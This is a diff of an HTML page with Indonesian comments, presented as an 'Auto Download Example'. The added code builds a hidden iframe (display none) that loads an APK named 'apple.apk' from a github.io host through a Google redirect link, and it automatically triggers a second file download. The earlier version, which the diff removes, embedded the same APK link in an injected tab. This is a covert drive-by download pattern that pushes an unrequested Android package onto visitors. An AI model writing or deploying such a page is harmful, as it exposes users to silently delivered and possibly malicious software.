@@ -3,43 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download File .txt</title>
-    <script>
-        function go() {
-            // Membuka tab baru dengan URL yang ditentukan
-            var x = window.open('https://www.google.com/csi', '_blank'); 
-
-            setTimeout(function(){
-                // Menambahkan konten di tab yang baru
-                x.document.body.innerHTML = 
-                    '<h1>Welcome to the Page</h1>' +
-                    '<p>This page was opened by a script. Please review the content carefully.</p>' +
-                    '<br><br>' +
-                    // Tombol untuk mendownload file
-                    '<button onclick="downloadFile()">Download Text File</button>' +
-                    '<br><br>' +
-                    // Link untuk manual download
-                    '<a href="https://www.example.com/path/to/your/file.txt" download="file.txt">Download the File (Manual)</a>' +
-                    '<br><br>' +
-                    // Menampilkan iframe dari sumber yang terpercaya
-                    '<h2>Embedded iFrame Example</h2>' +
-                    '<iframe src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.apk&sa=D&sntz=1&usg=AOvVaw0onE08hhdtlihXeKuCFYTr" width="600" height="400"></iframe>';
-            }, 3000);
+    <title>Auto Download Example</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
         }
+        iframe {
+            margin-top: 20px;
+        }
+    </style>
+    <script>
+        function autoDownload() {
+            // Membuka iframe untuk memuat URL
+            var iframe = document.createElement('iframe');
+            iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.apk&sa=D&sntz=1&usg=AOvVaw0onE08hhdtlihXeKuCFYTr";
+            iframe.style.display = 'none'; // Menyembunyikan iframe
+            document.body.appendChild(iframe);
 
-        // Fungsi untuk mendownload file dari URL tertentu
-        function downloadFile() {
-            const fileUrl = 'https://www.example.com/path/to/your/file.txt'; // Ganti dengan URL file yang ingin diunduh
-
-            // Membuat link untuk mendownload file dari URL yang ditentukan
+            // Membuat pengunduhan file otomatis
             var link = document.createElement('a');
-            link.href = fileUrl;
-            link.download = 'file.txt'; // Nama file saat diunduh
-            link.click(); // Memulai proses download
+            link.href = "https://www.example.com/path/to/your/file.txt"; // Ganti dengan URL file yang ingin diunduh
+            link.download = "file.txt"; // Nama file yang akan diunduh
+            link.click(); // Memulai pengunduhan
         }
     </script>
 </head>
 <body>
-    <button onclick="go()">Open Google and Download File</button> <!-- Tombol untuk membuka tab Google/CSI -->
+    <h1>Welcome to the Auto-Download Example</h1>
+    <p>The download will start automatically shortly...</p>
+    <button onclick="autoDownload()">Start Auto-Download</button>
 </body>
 </html>
